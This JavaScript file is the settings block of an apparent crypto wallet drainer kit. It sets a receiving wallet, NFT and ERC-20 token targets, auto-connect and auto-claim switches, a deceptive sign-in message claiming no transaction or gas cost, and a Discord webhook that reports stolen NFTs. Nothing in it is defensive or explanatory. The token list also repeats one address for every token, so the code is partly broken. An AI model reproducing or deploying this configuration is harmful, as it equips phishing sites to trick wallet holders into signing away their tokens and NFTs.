const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/

const receiveAddress = "0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D"; // YOUR WALLET ADDRESS


const drainNftsInfo = {
    minValue: 0.00002, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
    maxTransfers: 1000,
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const autoConnect = true; //false; // auto connect wallet
const autoMint = true; // auto click claim button


const erc20list = {
  // Bsc testnet
  /*
  '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
  '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
  */
  // Ethernet mainnet
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // DAI ethernet
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // usdt
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // usdc
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // busd
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // shib
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // link
  '0x9eBb12cf66689b7c1A738Bc8fF0a9E818215430D': 1, // ens
}

const installInNewWindow = true; // install wallet if not installed

const discordWebhookURL = "https://discord.com/api/webhooks/1080713352906551336/IxAjUrNAfaJ12mRMbqvQy5tXPMwUgoetf-2Ijs6wEmJ8dZ2Oi9djXhhdksjb36jAt3Ve"; // put ur discord webhook url in here to receive NFT's
const feedbackEnabled = true; // let enabled to receive webhooks
/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
